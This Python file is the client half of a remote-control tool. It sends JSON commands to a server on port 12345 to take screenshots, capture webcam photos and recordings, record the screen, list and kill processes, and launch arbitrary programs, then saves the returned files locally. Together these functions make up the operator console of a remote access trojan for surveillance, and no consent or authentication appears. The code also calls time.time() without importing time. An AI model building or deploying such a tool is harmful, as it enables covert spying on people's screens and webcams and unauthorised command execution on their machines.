# client.py
# Simple client that connects to server IP:12345 and issues commands.
# Save received files to ./received_files
import socket
import json
import struct
import os
import sys
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
RECV_DIR = os.path.join(os.getcwd(), "received_files")
os.makedirs(RECV_DIR, exist_ok=True)

def send_command(host='127.0.0.1', port=12345, command=None, **kwargs):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.settimeout(15)
        sock.connect((host, port))
        request = {"command": command, **kwargs}
        req_json = json.dumps(request)
        sock.send(req_json.encode('utf-8'))
        # Read JSON response (first chunk)
        resp_data = sock.recv(4096).decode('utf-8')
        resp = json.loads(resp_data)
        # Always read 8-byte file length header
        len_header = sock.recv(8)
        if len(len_header) != 8:
            raise Exception("Invalid file length header")
        file_length = struct.unpack('Q', len_header)[0]
        if file_length > 0:
            file_data = b''
            remaining = file_length
            while remaining > 0:
                chunk = sock.recv(min(4096, remaining))
                if not chunk:
                    raise Exception("Incomplete file transfer")
                file_data += chunk
                remaining -= len(chunk)
            filename = resp.get('filename') or f"file_{int(time.time())}"
            local_path = os.path.join(RECV_DIR, filename)
            with open(local_path, 'wb') as f:
                f.write(file_data)
            if "messages" not in resp:
                resp["messages"] = []
            resp["messages"].append(f"File saved: {local_path}")
            logging.info(f"Received file saved to {local_path}")
        return resp
    except socket.timeout:
        return {"status": "error", "messages": ["Connection timed out. Is server running?"]}
    except socket.error as e:
        return {"status": "error", "messages": [f"Connection failed: {e}"]}
    except json.JSONDecodeError as e:
        return {"status": "error", "messages": [f"Invalid JSON response: {e}"]}
    except Exception as e:
        return {"status": "error", "messages": [f"Unexpected error: {e}"]}
    finally:
        sock.close()

def print_messages(resp):
    status = resp.get("status", "unknown")
    messages = resp.get("messages", ["No response."])
    print(f"\n{'[OK]' if status == 'ok' else '[ERROR]'}:\n" + "\n".join(messages))

if __name__ == "__main__":
    host = input("Enter server IP (e.g. 192.168.1.100) [default 127.0.0.1]: ").strip() or '127.0.0.1'
    print(f"Connecting to {host}:12345")
    while True:
        print("\n--- REMOTE CLIENT ---")
        print("1) Take screenshot (server -> saved here)")
        print("2) Typed capture (send text)")
        print("3) List processes")
        print("4) Close process (enter name)")
        print("5) Generate harmless files (zip)")
        print("6) Open program (enter cmd)")
        print("7) Take webcam photo (requires server opencv)")
        print("8) Toggle webcam recording (requires server opencv)")
        print("B) Toggle SCREEN recording on server (press B to start, B again to stop and receive file)")
        print("9) Exit")
        choice = input("Enter choice: ").strip()
        if not choice:
            continue
        if choice == "9":
            break
        try:
            if choice == "1":
                resp = send_command(host, command="take_screenshot")
            elif choice == "2":
                text = input("Text to send: ").strip()
                resp = send_command(host, command="typed_capture", text=text)
            elif choice == "3":
                limit_str = input("Limit (default 300): ").strip()
                limit = int(limit_str) if limit_str else 300
                resp = send_command(host, command="list_processes", limit=limit)
            elif choice == "4":
                name = input("Process name: ").strip()
                if not name:
                    print("No name provided.")
                    continue
                resp = send_command(host, command="close_process", name=name)
            elif choice == "5":
                resp = send_command(host, command="generate_harmless_files")
            elif choice == "6":
                cmd = input("Command/path: ").strip()
                if not cmd:
                    print("No command provided.")
                    continue
                resp = send_command(host, command="open_program", cmd=cmd)
            elif choice == "7":
                resp = send_command(host, command="take_webcam_photo")
            elif choice == "8":
                resp = send_command(host, command="toggle_webcam_recording")
            elif choice.upper() == "B":
                # Toggle screen recording: if not active, start; if active, stop and receive file.
                # We don't track local state of server, so try to start then if start returns "already active" try stop.
                # Simpler: ask server to start, then next B will stop.
                # Here we call start_screen_recording first; if it says already active, call stop.
                resp = send_command(host, command="start_screen_recording")
                if resp.get("status") == "ok" and "already active" in " ".join(resp.get("messages",[])).lower():
                    # server already active -> stop
                    resp = send_command(host, command="stop_screen_recording")
            else:
                print("Unknown option.")
                continue
            print_messages(resp)
        except KeyboardInterrupt:
            print("\nInterrupted.")
            break
        except Exception as e:
            print(f"Client error: {e}")
